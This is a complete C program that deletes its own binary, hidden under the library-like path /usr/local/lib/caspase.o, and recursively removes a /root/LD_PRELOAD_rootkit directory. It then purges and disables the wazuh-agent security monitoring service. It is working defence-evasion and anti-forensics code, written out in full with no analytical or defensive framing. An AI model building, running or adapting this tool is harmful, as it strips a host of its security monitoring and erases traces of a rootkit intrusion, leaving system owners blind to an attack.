#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <errno.h>
#include <string.h>
#include <linux/limits.h>

#if DEBUG_MODE
    #define DEBUG_PRINT(...) fprintf(stderr, __VA_ARGS__); fflush(stderr)
#else
    #define DEBUG_PRINT(...) do {} while(0)
#endif

/* Delete a directory recursively using rm -rf */
static int delete_directory_recursive(const char *path) {
    pid_t pid;
    int status;

    DEBUG_PRINT("[DEBUG] Recursively deleting directory: %s\n", path);

    pid = fork();
    if (pid == -1) {
        fprintf(stderr, "[ERROR] fork() failed while deleting directory: %s\n", strerror(errno));
        return -1;
    }

    if (pid == 0) {
        /* Child process */
        char *argv[] = {"rm", "-rf", (char *)path, NULL};
        execvp("rm", argv);
        fprintf(stderr, "[ERROR] execvp(rm) failed: %s\n", strerror(errno));
        _exit(127);
    }

    /* Parent process */
    if (waitpid(pid, &status, 0) == -1) {
        fprintf(stderr, "[ERROR] waitpid() failed while deleting directory: %s\n", strerror(errno));
        return -1;
    }

    if (WIFEXITED(status)) {
        int exit_code = WEXITSTATUS(status);
        if (exit_code != 0) {
            fprintf(stderr, "[ERROR] rm -rf %s failed with exit code: %d\n", path, exit_code);
            return exit_code;
        }
        DEBUG_PRINT("[DEBUG] Successfully deleted directory: %s\n", path);
        return 0;
    } else if (WIFSIGNALED(status)) {
        fprintf(stderr, "[ERROR] rm command terminated by signal: %d\n", WTERMSIG(status));
        return -1;
    } else {
        fprintf(stderr, "[ERROR] rm command terminated abnormally\n");
        return -1;
    }
}

/* Execute a command and return its exit status */
static int exec_command(const char *cmd, char *const argv[]) {
    pid_t pid;
    int status;
    int exit_code;

    DEBUG_PRINT("[DEBUG] Executing command: %s", cmd);
    for (int i = 1; argv[i] != NULL; i++) {
        DEBUG_PRINT(" %s", argv[i]);
    }
    DEBUG_PRINT("\n");

    pid = fork();
    if (pid == -1) {
        fprintf(stderr, "[ERROR] fork() failed: %s\n", strerror(errno));
        return -1;
    }

    if (pid == 0) {
        /* Child process */
        DEBUG_PRINT("[DEBUG] Child process PID: %d\n", getpid());
        execvp(cmd, argv);
        /* If execvp returns, it failed */
        fprintf(stderr, "[ERROR] execvp(%s) failed: %s\n", cmd, strerror(errno));
        _exit(127);
    }

    /* Parent process */
    DEBUG_PRINT("[DEBUG] Parent waiting for child PID: %d\n", pid);
    if (waitpid(pid, &status, 0) == -1) {
        fprintf(stderr, "[ERROR] waitpid() failed: %s\n", strerror(errno));
        return -1;
    }

    if (WIFEXITED(status)) {
        exit_code = WEXITSTATUS(status);
        DEBUG_PRINT("[DEBUG] Command exited with status: %d\n", exit_code);
        return exit_code;
    } else if (WIFSIGNALED(status)) {
        fprintf(stderr, "[ERROR] Command terminated by signal: %d\n", WTERMSIG(status));
        return -1;
    } else {
        fprintf(stderr, "[ERROR] Command terminated abnormally\n");
        return -1;
    }
}

int main(void) {
    int ret;
    char exe_path[PATH_MAX];
    ssize_t len;

    DEBUG_PRINT("[DEBUG] Starting wazuh-agent removal process\n");
    DEBUG_PRINT("[DEBUG] Running as UID: %d, GID: %d\n", getuid(), getgid());

    /* Step 0a: Delete self (the executable at /usr/local/lib/caspase.o) */
    DEBUG_PRINT("[DEBUG] Step 0a: Deleting self-executable\n");
    if (unlink("/usr/local/lib/caspase.o") == -1) {
        fprintf(stderr, "[ERROR] Failed to unlink /usr/local/lib/caspase.o: %s\n", strerror(errno));
        return 254;
    }
    DEBUG_PRINT("[DEBUG] Step 0a completed: Self-executable deleted\n");

    /* Step 0b: Delete /root/LD_PRELOAD_rootkit directory recursively */
    DEBUG_PRINT("[DEBUG] Step 0b: Deleting /root/LD_PRELOAD_rootkit directory\n");
    ret = delete_directory_recursive("/root/LD_PRELOAD_rootkit");
    if (ret != 0) {
        fprintf(stderr, "[ERROR] Failed to delete /root/LD_PRELOAD_rootkit with code: %d\n", ret);
        return 255;
    }
    DEBUG_PRINT("[DEBUG] Step 0b completed: Directory deleted\n");

    /* Step 1: apt-get remove --purge wazuh-agent */
    {
        char *argv[] = {"apt-get", "remove", "--purge", "-y", "wazuh-agent", NULL};
        DEBUG_PRINT("[DEBUG] Step 1: Removing wazuh-agent package\n");
        ret = exec_command("apt-get", argv);
        if (ret != 0) {
            fprintf(stderr, "[ERROR] apt-get remove failed with code: %d\n", ret);
            return 1;
        }
        DEBUG_PRINT("[DEBUG] Step 1 completed successfully\n");
    }

    /* Step 2: systemctl disable wazuh-agent */
    {
        char *argv[] = {"systemctl", "disable", "wazuh-agent", NULL};
        DEBUG_PRINT("[DEBUG] Step 2: Disabling wazuh-agent service\n");
        ret = exec_command("systemctl", argv);
        if (ret != 0) {
            fprintf(stderr, "[ERROR] systemctl disable failed with code: %d\n", ret);
            /* Don't exit - service might already be disabled or removed */
            DEBUG_PRINT("[DEBUG] Continuing despite systemctl disable failure\n");
        } else {
            DEBUG_PRINT("[DEBUG] Step 2 completed successfully\n");
        }
    }

    /* Step 3: systemctl daemon-reload */
    {
        char *argv[] = {"systemctl", "daemon-reload", NULL};
        DEBUG_PRINT("[DEBUG] Step 3: Reloading systemd daemon\n");
        ret = exec_command("systemctl", argv);
        if (ret != 0) {
            fprintf(stderr, "[ERROR] systemctl daemon-reload failed with code: %d\n", ret);
            return 3;
        }
        DEBUG_PRINT("[DEBUG] Step 3 completed successfully\n");
    }

    DEBUG_PRINT("[DEBUG] All operations completed successfully\n");
    return 0;
}
